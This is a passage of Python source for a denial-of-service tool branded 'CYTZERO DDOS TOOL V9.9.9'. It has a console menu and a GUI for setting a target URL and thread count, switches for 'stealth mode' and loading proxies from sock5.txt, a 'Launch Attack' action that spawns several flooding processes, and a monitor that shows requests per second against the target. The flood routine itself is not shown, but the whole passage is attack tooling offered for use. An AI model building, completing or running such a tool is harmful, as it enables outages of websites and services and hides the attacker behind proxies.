                print(f"{Fore.RED}File not found in script directory either{Style.RESET_ALL}")
                return []

        print(f"{Fore.GREEN}Found sock5.txt at: {file_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Attempting to open sock5.txt...{Style.RESET_ALL}")
        
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            print(f"{Fore.YELLOW}File size: {len(content)} bytes{Style.RESET_ALL}")
            
            if not content.strip():
                print(f"{Fore.RED}File is empty{Style.RESET_ALL}")
                return []
                
            proxy_list = []
            line_count = 0
            
            for line in content.splitlines():
                line_count += 1
                line = line.strip()
                if not line:  # Skip empty lines
                    continue
                    
                try:
                    # Check if the line contains IP:PORT format directly
                    if ':' in line:
                        # Extract just the IP:PORT if there's a delimiter, otherwise use the whole line
                        proxy = line.split('|')[-1].strip() if '|' in line else line.strip()
                        if all(part.strip() for part in proxy.split(':')):  # Verify both IP and port are non-empty
                            proxy_list.append(f"http://{proxy}")
                            print(f"{Fore.GREEN}Successfully parsed proxy: {proxy}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.YELLOW}Line {line_count}: Invalid IP:PORT format: {proxy}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}Line {line_count}: No port number found in: {line}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error parsing line {line_count}: {line} - {str(e)}{Style.RESET_ALL}")
                    continue
                    
            if not proxy_list:
                print(f"{Fore.RED}No valid proxies found in sock5.txt (processed {line_count} lines){Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Found {len(proxy_list)} valid proxies out of {line_count} lines{Style.RESET_ALL}")
            return proxy_list
            
    except FileNotFoundError:
        print(f"{Fore.RED}Error: sock5.txt not found in any location{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please make sure sock5.txt is in the same folder as the script{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}Error reading sock5.txt: {str(e)}{Style.RESET_ALL}")
        return []

# Function to show menu and get user input
def show_menu():
    menu_border_top = f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}"
    menu_title = f"{Fore.CYAN}║{Style.RESET_ALL}          {Fore.RED}⚡ CYTZERO DDOS TOOL V9.9.9 ⚡{Style.RESET_ALL}          {Fore.CYAN}║{Style.RESET_ALL}"
    menu_subtitle = f"{Fore.CYAN}║{Style.RESET_ALL}              {Fore.YELLOW}Developed by FRMDAO - CYTZERO{Style.RESET_ALL}              {Fore.CYAN}║{Style.RESET_ALL}"
    menu_border_mid = f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}"
    menu_border_bottom = f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
    
    print("\n" + menu_border_top)
    print(menu_title)
    print(menu_subtitle)
    print(menu_border_mid)
    
    # Configuration Options Section
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}[Configuration Options]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}[1]{Style.RESET_ALL} │ Set Target URL")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}[2]{Style.RESET_ALL} │ Set Number of Threads {Fore.YELLOW}(Current: {num_requests}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}")
    
    # Attack Mode Options Section
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}[Attack Mode Options]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}[3]{Style.RESET_ALL} │ Toggle Stealth Mode {Fore.YELLOW}[{Fore.GREEN if stealth_mode else Fore.RED}{'✓' if stealth_mode else '✗'}{Style.RESET_ALL}{Fore.YELLOW}]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}[4]{Style.RESET_ALL} │ Toggle Online Proxy {Fore.YELLOW}[{Fore.GREEN if use_proxy else Fore.RED}{'✓' if use_proxy else '✗'}{Style.RESET_ALL}{Fore.YELLOW}]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}")
    
    # Proxy Options Section
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}[Proxy Options]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}[5]{Style.RESET_ALL} │ Load Proxies from sock5.txt {Fore.YELLOW}[{len(proxies)} loaded]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}")
    
    # Action Options Section
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}[Actions]{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}[6]{Style.RESET_ALL} │ 🚀 Launch Attack {Fore.RED}(Ctrl+C to stop){Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.YELLOW}[7]{Style.RESET_ALL} │ Exit Program")
    
    # Target Info Section
    if url:
        print(f"{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.RED}[Current Target]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.YELLOW}URL:{Style.RESET_ALL} {url}")
    
    print(menu_border_bottom)
    
    choice = input(f"\n{Fore.CYAN}Select Option {Fore.GREEN}➜{Style.RESET_ALL} ")
    return choice

# Global variables to store options
url = None
num_requests = DEFAULT_REQUESTS
stealth_mode = False
use_proxy = False
proxies = []
ascii_printed = False

# Main function that processes menu and starts attack
def main():
    global url, num_requests, stealth_mode, use_proxy, proxies, ascii_printed

    # Cleanup any existing process file at startup
    cleanup_processes()

    if not ascii_printed:
        print(ASCII_ART)
        ascii_printed = True

    try:
        while True:
            choice = show_menu()

            if choice == '1':
                url = input(f"{Fore.CYAN}Enter Target URL {Fore.GREEN}➜{Style.RESET_ALL} ")
            elif choice == '2':
                try:
                    num_requests = int(input(f"{Fore.CYAN}Enter Number of Requests {Fore.GREEN}➜{Style.RESET_ALL} "))
                except ValueError:
                    print(f"{Fore.RED}Invalid input. Using default request count.{Style.RESET_ALL}")
                    num_requests = DEFAULT_REQUESTS
            elif choice == '3':
                stealth_mode = not stealth_mode
                print(f"Stealth Mode is now: {Fore.GREEN if stealth_mode else Fore.RED}{stealth_mode}{Style.RESET_ALL}")
            elif choice == '4':
                use_proxy = not use_proxy
                print(f"Online Proxy Usage is now: {Fore.GREEN if use_proxy else Fore.RED}{use_proxy}{Style.RESET_ALL}")
                if use_proxy:
                    print(f"{Fore.YELLOW}Fetching proxy list...{Style.RESET_ALL}")
                    proxies = asyncio.run(get_all_proxies())
                    if proxies:
                        print(f"{Fore.GREEN}Successfully fetched {len(proxies)} proxies.{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}Failed to fetch proxies. Attack will continue without proxies.{Style.RESET_ALL}")
                        use_proxy = False
                else:
                    proxies = []
            elif choice == '5':
                print(f"{Fore.YELLOW}Loading proxies from sock5.txt...{Style.RESET_ALL}")
                loaded_proxies = load_proxies_from_file()
                if loaded_proxies:
                    proxies = loaded_proxies
                    use_proxy = True
                    print(f"{Fore.GREEN}Successfully loaded {len(proxies)} proxies from sock5.txt{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Failed to load proxies from sock5.txt{Style.RESET_ALL}")
            elif choice == '6':
                if not url:
                    print(f"{Fore.RED}Target URL not set. Please enter a URL first.{Style.RESET_ALL}")
                else:
                    clear_screen()
                    print(ASCII_ART)
                    print(f"{Fore.YELLOW}Starting attack...{Style.RESET_ALL}")
                    asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
                    print(f"{Fore.GREEN}Attack completed.{Style.RESET_ALL}")
            elif choice == '7':
                print(f"\n{Fore.YELLOW}Thanks for using CYTZERO DDOS!{Style.RESET_ALL}")
                cleanup_processes()
                break
            else:
                print(f"{Fore.RED}Invalid option. Please try again.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Terminating all processes...{Style.RESET_ALL}")
        cleanup_processes()
        print(f"{Fore.GREEN}Goodbye!{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Error occurred: {str(e)}{Style.RESET_ALL}")
        cleanup_processes()
        sys.exit(1)

def kill_all_terminals():
    try:
        # Silently kill using process file
        if os.path.exists(PROCESS_FILE):
            with open(PROCESS_FILE, 'r') as f:
                data = json.load(f)
            for pid in data.get("child_pids", []):
                try:
                    if os.name == 'nt':  # Windows
                        # Forcefully terminate process tree without any window
                        subprocess.run(['taskkill', '/F', '/T', '/PID', str(pid)], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW)
                    else:  # Linux/Unix
                        os.kill(pid, signal.SIGTERM)
                except:
                    pass

        # Silently kill any remaining processes by title (Windows only)
        if os.name == 'nt':
            # Kill all CMD windows with DDOS in title
            subprocess.run(['taskkill', '/F', '/FI', 'WINDOWTITLE eq DDOS*'], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Kill all python processes running our script
            subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/FI', f'WINDOWTITLE eq *DDOS*'],
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Additional silent cleanup using psutil
            for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                try:
                    if proc.info['window_title'] and "DDOS" in proc.info['window_title']:
                        proc.kill()
                except:
                    continue

        # Silently remove process file
        if os.path.exists(PROCESS_FILE):
            os.remove(PROCESS_FILE)

    except:
        pass  # Suppress all errors for silent operation

# Add new function to update monitor data
def update_monitor_data(terminal_id, stats):
    try:
        with open(MONITOR_FILE, 'a') as f:
            stats['timestamp'] = time.time()
            f.write(json.dumps(stats) + '\n')
    except Exception as e:
        pass  # Silently fail to avoid spamming errors

# Add new function to run the monitor terminal
async def run_monitor_terminal():
    clear_screen()
    
    start_time = time.time()
    target_url = "Unknown"
    
    # Try to get target URL
    try:
        if os.path.exists(MONITOR_TARGET_FILE):
            with open(MONITOR_TARGET_FILE, 'r') as f:
                target_url = f.read().strip()
    except:
        pass
    
    while True:
        try:
            clear_screen()
            print(ASCII_ART)
            
            current_time = time.time()
            total_requests = 0
            recent_requests = 0
            
            # Read and process recent data
            if os.path.exists(MONITOR_FILE):
                with open(MONITOR_FILE, 'r') as f:
                    lines = f.readlines()
                    # Only process last 100 lines for efficiency
                    for line in lines[-100:]:
                        try:
                            data = json.loads(line.strip())
                            if current_time - data.get('timestamp', 0) <= 1:  # Only count last second
                                recent_requests += data.get('success', 0) + data.get('failure', 0)
                            total_requests += data.get('success', 0) + data.get('failure', 0)
                        except:
                            continue
            
            # Calculate current RPS
            current_rps = recent_requests
            
            # Create fancy display
            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════╗{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL}           {Fore.RED}CYTZERO DDOS MONITOR{Style.RESET_ALL}           {Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════╣{Style.RESET_ALL}")
            
            # Display target URL with proper padding
            target_display = target_url[:40]  # Take first 40 chars
            padding = " " * (40 - len(target_display))  # Calculate padding needed
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}TARGET:{Style.RESET_ALL} {Fore.RED}{target_display}{padding}{Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}")
            
            # If URL is longer than 40 chars, show the rest on next line(s)
            if len(target_url) > 40:
                remaining = target_url[40:]
                while remaining:
                    chunk = remaining[:40]
                    padding = " " * (40 - len(chunk))
                    print(f"{Fore.CYAN}║{Style.RESET_ALL}        {Fore.RED}{chunk}{padding}{Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}")
                    remaining = remaining[40:]
            
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════╣{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Current RPS:{Style.RESET_ALL} {Fore.GREEN}{current_rps:,}{Style.RESET_ALL}{' ' * (37 - len(str(current_rps)))}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Total Requests:{Style.RESET_ALL} {Fore.GREEN}{total_requests:,}{Style.RESET_ALL}{' ' * (34 - len(str(total_requests)))}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Runtime:{Style.RESET_ALL} {Fore.GREEN}{int(current_time - start_time)}s{Style.RESET_ALL}{' ' * (39 - len(str(int(current_time - start_time))))}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════╣{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL}              {Fore.RED}CREDITS{Style.RESET_ALL}                     {Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} Developer: {Fore.GREEN}FRMDAO{Style.RESET_ALL}{' ' * 31}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} Team: {Fore.GREEN}CYTZERO{Style.RESET_ALL}{' ' * 33}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} Version: {Fore.GREEN}9.9.9{Style.RESET_ALL}{' ' * 32}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════╝{Style.RESET_ALL}")
            
            # Clear old data periodically (keep last 1000 lines)
            if os.path.exists(MONITOR_FILE):
                with open(MONITOR_FILE, 'r') as f:
                    lines = f.readlines()
                if len(lines) > 1000:
                    with open(MONITOR_FILE, 'w') as f:
                        f.writelines(lines[-1000:])
            
            await asyncio.sleep(MONITOR_UPDATE_INTERVAL)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{Fore.RED}Monitor error: {str(e)}{Style.RESET_ALL}")
            await asyncio.sleep(MONITOR_UPDATE_INTERVAL)

class CytzeroGUI:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("CYTZERO DDOS TOOL V9.9.9")
        self.root.geometry("800x600")
        self.root.resizable(False, False)
        
        # Set dark theme
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        
        # Initialize variables
        self.url = tk.StringVar()
        self.num_requests = tk.StringVar(value=str(DEFAULT_REQUESTS))
        self.stealth_mode = tk.BooleanVar(value=False)
        self.use_proxy = tk.BooleanVar(value=False)
        self.proxy_count = tk.StringVar(value="0")
        self.attack_running = False
        self.proxies = []  # Initialize proxies list
        self.child_pids = []  # Store child PIDs
        
        # Register cleanup on window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Register signal handlers in main thread
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Create and setup background canvas
        self.setup_background()
        
        self.create_gui()
        
        # Start animation
        self.animate_background()
        
    def signal_handler(self, signum, frame):
        self.cleanup_attack()
        self.root.quit()

    def on_closing(self):
        self.cleanup_attack()
        self.root.quit()

    def run_attack(self, url, num_requests, stealth_mode, use_proxy, stop_event):
        try:
            # Run the attack in the current process
            asyncio.run(flood(
                url=url,
                num_requests=num_requests,
                stealth_mode=stealth_mode,
                use_proxy=use_proxy,
                proxies=self.proxies if use_proxy else []
            ))
        except Exception as e:
            print(f"{Fore.RED}Error in attack: {str(e)}{Style.RESET_ALL}")
        finally:
            if not stop_event.is_set():
                self.cleanup_attack()

    def start_attack(self):
        if not self.url.get():
            messagebox.showerror("Error", "Please enter a target URL first!")
            return
            
        if self.attack_running:
            messagebox.showinfo("Info", "Attack is already running!")
            return
            
        try:
            num_requests = int(self.num_requests.get())
        except ValueError:
            messagebox.showerror("Error", "Invalid number of threads!")
            return
        
        # Set attack running flag
        self.attack_running = True
        self.status_label.configure(text="Starting attack...")
        
        # Create a stop event for the attack
        self.stop_event = threading.Event()
        
        # Add --gui-mode to sys.argv to prevent double spawning
        if '--gui-mode' not in sys.argv:
            sys.argv.append('--gui-mode')
        
        # Start background terminals
        try:
            # Spawn terminals and store child PIDs
            self.child_pids = spawn_attack_terminals(
                self.url.get(),
                num_requests,
                self.stealth_mode.get(),
                self.use_proxy.get()
            )
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start attack terminals: {str(e)}")
            self.cleanup_attack()
            return
        
        # Start main attack thread
        self.attack_thread = threading.Thread(
            target=self.run_attack,
            args=(
                self.url.get(),
                num_requests,
                self.stealth_mode.get(),
                self.use_proxy.get(),
                self.stop_event
            )
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Change attack button to stop button
        self.attack_button.configure(
            text="🛑 Stop Attack",
            command=self.stop_attack,
            fg_color="#CC0000",
            hover_color="#AA0000"
        )

    def cleanup_attack(self):
        if hasattr(self, 'stop_event'):
            self.stop_event.set()
        
        # Kill all child processes
        for pid in self.child_pids:
            try:
                kill_process_tree(pid)
            except:
                pass
        
        # Reset GUI state
        self.attack_running = False
        self.child_pids = []
        self.progress_bar.set(0)
        self.status_label.configure(text="Ready")
        
        # Reset attack button
        self.attack_button.configure(
            text="🚀 Launch Attack",
            command=self.start_attack,
            fg_color="#FF3333",
            hover_color="#CC0000"
        )
        
        # Cleanup files
        for file in [PROCESS_FILE, PROXY_SHARE_FILE, MONITOR_FILE, MONITOR_TARGET_FILE]:
            try:
                if os.path.exists(file):
                    os.remove(file)
            except:
                pass

    def run(self):
        self.root.mainloop()

    def setup_background(self):
        # Create background canvas with gradient
        self.bg_canvas = tk.Canvas(
            self.root,
            width=800,
            height=600,
            bg="#0a0a0a",  # Darker background
            highlightthickness=0
        )
        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
        
        # Create gradient background
        for i in range(600):
            color = f"#{10-i//100:02x}{10-i//100:02x}{12-i//100:02x}"
            self.bg_canvas.create_line(0, i, 800, i, fill=color)
        
        # Initialize connections list
        self.connections = []
        
        # Create particles
        self.particles = []
        for _ in range(50):  # More particles
            self.particles.append(Particle(self.bg_canvas, 800, 600))

    def draw_connections(self):
        # Remove old connections
        for line in self.connections:
            self.bg_canvas.delete(line)
        self.connections.clear()
        
        # Draw new connections between nearby particles
        for i, p1 in enumerate(self.particles):
            for p2 in self.particles[i+1:]:
                dx = p1.x - p2.x
                dy = p1.y - p2.y
                distance = math.sqrt(dx*dx + dy*dy)
                
                if distance < 100:  # Maximum distance for connection
                    # Calculate opacity based on distance
                    opacity = int((1 - distance/100) * 255)
                    color = f"#{opacity:02x}{opacity:02x}{opacity:02x}"
                    
                    line = self.bg_canvas.create_line(
                        p1.x + p1.size/2, p1.y + p1.size/2,
                        p2.x + p2.size/2, p2.y + p2.size/2,
                        fill=color,
                        width=1,
                        stipple="gray50"
                    )
                    self.connections.append(line)
    
    def animate_background(self):
        for particle in self.particles:
            particle.move()
        self.draw_connections()  # Update connections
        self.root.after(30, self.animate_background)  # Faster updates for smoother animation

    def create_gui(self):
        # Create main frame
        main_frame = ctk.CTkFrame(self.root)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Title
        title_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        title_frame.pack(fill="x", pady=(0, 20))
        
        title_label = ctk.CTkLabel(
            title_frame,
            text="⚡ CYTZERO DDOS TOOL ⚡",
            font=("Helvetica", 24, "bold")
        )
        title_label.pack()
        
        subtitle_label = ctk.CTkLabel(
            title_frame,
            text="Developed by FRMDAO - CYTZERO",
            font=("Helvetica", 12)
        )
        subtitle_label.pack()
        
        # Create two columns
        left_frame = ctk.CTkFrame(main_frame)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10))
        
        right_frame = ctk.CTkFrame(main_frame)
        right_frame.pack(side="right", fill="both", expand=True, padx=(10, 0))
        
        # Left Frame Content - Configuration
        ctk.CTkLabel(left_frame, text="Target Configuration", font=("Helvetica", 16, "bold")).pack(pady=(10, 5))
        
        # URL Entry
        url_frame = ctk.CTkFrame(left_frame)
        url_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(url_frame, text="Target URL:").pack(side="left", padx=5)
        url_entry = ctk.CTkEntry(url_frame, textvariable=self.url, width=200)
        url_entry.pack(side="left", padx=5, fill="x", expand=True)
        
        # Threads Entry
        threads_frame = ctk.CTkFrame(left_frame)
        threads_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(threads_frame, text="Threads:").pack(side="left", padx=5)
        threads_entry = ctk.CTkEntry(threads_frame, textvariable=self.num_requests, width=100)
        threads_entry.pack(side="left", padx=5)
        
        # Mode Toggles
        modes_frame = ctk.CTkFrame(left_frame)
        modes_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkSwitch(modes_frame, text="Stealth Mode", variable=self.stealth_mode).pack(pady=5)
        ctk.CTkSwitch(modes_frame, text="Use Online Proxies", variable=self.use_proxy).pack(pady=5)
        
        # Right Frame Content - Actions
        ctk.CTkLabel(right_frame, text="Actions", font=("Helvetica", 16, "bold")).pack(pady=(10, 5))
        
        # Proxy Actions
        proxy_frame = ctk.CTkFrame(right_frame)
        proxy_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkButton(
            proxy_frame,
            text="Load Proxies from sock5.txt",
            command=self.load_proxies_gui
        ).pack(fill="x", pady=5)
        
        ctk.CTkLabel(
            proxy_frame,
            textvariable=self.proxy_count,
            font=("Helvetica", 12)
        ).pack()
        
        # Attack Button
        self.attack_button = ctk.CTkButton(
            right_frame,
            text="🚀 Launch Attack",
            command=self.start_attack,
            font=("Helvetica", 16, "bold"),
            height=40,
            fg_color="#FF3333",
            hover_color="#CC0000"
        )
        self.attack_button.pack(fill="x", padx=10, pady=20)
        
        # Status Frame
        self.status_frame = ctk.CTkFrame(main_frame)
        self.status_frame.pack(fill="x", pady=(20, 0))
        
        self.status_label = ctk.CTkLabel(
            self.status_frame,
            text="Ready",
            font=("Helvetica", 12)
        )
        self.status_label.pack()
        
        # Progress Bar
        self.progress_bar = ctk.CTkProgressBar(main_frame)
        self.progress_bar.pack(fill="x", pady=(10, 0))
        self.progress_bar.set(0)
        
        # Credits
        credits_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        credits_frame.pack(fill="x", pady=(20, 0))
        
        credits_label = ctk.CTkLabel(
            credits_frame,
            text="CYTZERO TEAM © 2025",
            font=("Helvetica", 10)
        )
        credits_label.pack()

    def load_proxies_gui(self):
        """Load proxies from sock5.txt file and update GUI"""
        loaded_proxies = load_proxies_from_file()
        if loaded_proxies:
            self.proxies = loaded_proxies  # Store loaded proxies
            self.proxy_count.set(f"Loaded Proxies: {len(loaded_proxies)}")
            self.use_proxy.set(True)  # Automatically enable proxy mode
            messagebox.showinfo("Success", f"Successfully loaded {len(loaded_proxies)} proxies!")
        else:
            self.proxies = []  # Reset proxies if loading failed
            self.proxy_count.set("Loaded Proxies: 0")
            self.use_proxy.set(False)  # Disable proxy mode
            messagebox.showerror("Error", "Failed to load proxies from sock5.txt")

# Update the main function to use GUI
if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == '--monitor':
            asyncio.run(run_monitor_terminal())
            sys.exit(0)
        elif sys.argv[1] == '--spawn-instance':
            try:
                url = sys.argv[2]
                num_requests = int(sys.argv[3])
                stealth_mode = bool(int(sys.argv[4]))
                use_proxy = bool(int(sys.argv[5])) if len(sys.argv) > 5 else False
                
                # Load proxies from shared file if using proxies
                proxies = []
                if use_proxy and os.path.exists(PROXY_SHARE_FILE):
                    try:
                        with open(PROXY_SHARE_FILE, 'r') as f:
                            proxies = json.load(f)
                    except Exception as e:
                        print(f"{Fore.RED}Failed to load proxies: {str(e)}{Style.RESET_ALL}")
                
                # Run the flood attack
                asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
            except Exception as e:
                print(f"{Fore.RED}Error in child process: {str(e)}{Style.RESET_ALL}")
                sys.exit(1)
    else:
        # Start the GUI
        app = CytzeroGUI()
        app.run()
